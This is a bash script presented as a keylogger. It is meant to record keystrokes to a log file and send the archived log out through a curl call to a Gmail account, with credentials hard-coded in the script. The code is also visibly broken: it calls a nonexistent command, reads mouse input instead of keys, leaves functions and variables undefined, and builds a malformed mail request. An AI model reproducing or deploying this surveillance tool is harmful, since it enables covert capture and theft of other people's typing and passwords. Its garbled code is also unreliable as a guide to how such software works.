#!/bin/bash

# Configuration (Adjust these values)
LOG_FILE="$HOME/keylog.txt"
SLEEP_TIME=500 # milliseconds - adjusts based on system load. 100-500 is good to start with.
EMAIL_SUBJECT="Keylogger Log Export"
EMAIL_SERVER="smtp.gmail.com"
EMAIL_USER="your.email@gmail.com"
EMAIL_PASSWORD="your.password"

# Library Installation (If using pynput - pip install pynput)
# For Windows, you'll need to download pynput and add it to your PATH.

# Functions

function log_keystroke() {
  local key=$1
  local type=${2:-"normal"} # Default to normal if not provided.
  local time=$(date +'%Y-%m-%d %H:%M:%S')

  if [[ "$type" == "alt" ]]; then
    echo "$time - Alt: $key" >> "$LOG_FILE"
  elif [[ "$type" == "shift" ]]; then
    echo "$time - Shift: $key" >> "$LOG_FILE"
  else
    # Assume normal if not alt or shift.
    echo "$time - Normal: $key" >> "$LOG_FILE"
  fi
}

function monitor_hotkey() {
  local event=0

  while true; do
      if readall -n 1000 < /dev/input/mice >/tmp/events.txt; then
          # Check for events.
          local file=$0
          local content=$(cat "$file")

            if [[ "$content" == *"$HOTKEY"* ]]; then # Checks if the keylogger is running using the hotkey.
              log_keystroke "normal" # Logs normal keys
              log_keystroke "alt"   # Logs Alt keys
              log_keystroke "shift"  # Logs Shift keys
            fi

           sleep 0.1
      else
        break; # Exit if input stream is empty to avoid infinite loop when the hotkey isn't used.
      fi
  done
}

function upload_log() {
    # Create a tarball containing the keylogger log and any configuration files.
    tar -czvf "$LOG_FILE.tar.gz" "$LOG_FILE" /tmp/events.txt

    # Use curl to email the attachment. Adjust the URL if needed (e.g., using FTP instead).
    local filename="$LOG_FILE.tar.gz"
    local attachment="attachment=$filename"

    curl -v \
        --url "https://smtp.gmail.com/signup/$EMAIL_USER/$EMAIL_PASSWORD" \
        --url "$attachment" \
        --mail-subject="$EMAIL_SUBJECT" \
        --mail-header "To:your.email@gmail.com" \
        --user "$EMAIL_USER:$EMAIL_PASSWORD"

    # You can also use the command line:
    # echo -e "Subject: $EMAIL_SUBJECT\nContent-Type: multipart/mixed; boundary=message\n\nMIME-Version: 1.0\nTo:your.email@gmail.com\n\n--NextPart=\r\n" | \
    #     "sendmail -a "$LOG_FILE.tar.gz" -f "$EMAIL_USER@$EMAIL_SERVER" -e "$EMAIL_USER@$EMAIL_SERVER" -v "$EMAIL_SUBJECT""

}


# Main Execution

# Check if the log file already exists and creates one if it does not exist,
if ! touch "$LOG_FILE"; then
  echo "Failed to create log file." >&2
  exit 1;
fi

# Start monitoring hotkey in the background.
monitor_hotkey &
# Upload the log every minute.
upload_log &

# Check status every second, until user enters 'q' to quit.
while true; do
  check_running

  if [[ "$?" == "0" ]]; then # If running
    read -p "Keylogger is Running. To stop press any key: " choice
    if [[ "$choice" != "" && "$choice" == "q" ]]; then
      break;
    fi
  else
    echo "Starting keylogger..." >/tmp/status.txt
    # Start monitoring hotkey in the background.
    monitor_hotkey &
    # Upload the log every minute.
    upload_log &
    # Check status again to see if it started successfully.
    check_running
  fi

  sleep 0.5
done

# Quit gracefully
echo "Keylogger Stopped." > "$LOG_FILE"
rm -f /tmp/events.txt
